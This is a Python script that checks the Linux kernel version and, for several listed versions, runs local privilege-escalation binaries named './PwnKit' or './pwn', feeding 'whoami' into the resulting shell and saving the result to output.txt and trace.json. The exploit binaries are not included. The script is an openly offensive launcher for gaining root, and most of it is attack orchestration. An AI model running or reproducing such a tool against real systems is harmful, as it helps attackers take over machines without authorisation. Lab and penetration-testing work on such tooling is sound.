import subprocess
import re
import json


def kernel_exploit():
    p = subprocess.Popen(['uname', '-r'], stdout=subprocess.PIPE).communicate()[0]
    kernel_name = p.decode('utf-8')

    global kernel_name1
    kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))

    if kernel_name1 == "5.9.0":
        args = ["./PwnKit"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)

    elif kernel_name1 == "5.7.0":
        args = ["./PwnKit"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)
        
    elif kernel_name1 == "5.5.0":
        args = ["./PwnKit"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)
        
    elif kernel_name1 == "4.19.0":
        args = ["./pwn"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)
        
    
    elif kernel_name1 == "4.18.0":
        args = ["./pwn"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)
        
    elif kernel_name1 == "4.15.11":
        args = ["./pwn"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)
        
    elif kernel_name1 == "4.13.0":
        args = ["./pwn"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)
    
    else:
        user = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
        user = user.decode('utf-8')
        with open('output.txt','w') as data:
            data.write(str(user))
        
        # dict = {kernel_name:user}
        # with open('output.txt','w') as data:
        #     data.wrtie(str(dict))
    

def file_to_Json():
    file = open('output.txt','r')
    text = file.read()
    dict = {kernel_name1:text}
    for key, value in dict.items():
        dict[key] = value.rstrip()
    
    # If you need only JSON invariable uncomment this
    # json_text = json.dumps(dict)
    # print(json_text)
    
    # If you need JSON file then use this
    with open('trace.json', 'w') as file:
        json.dump(dict,file,ensure_ascii=False,indent=4)

kernel_exploit()
file_to_Json()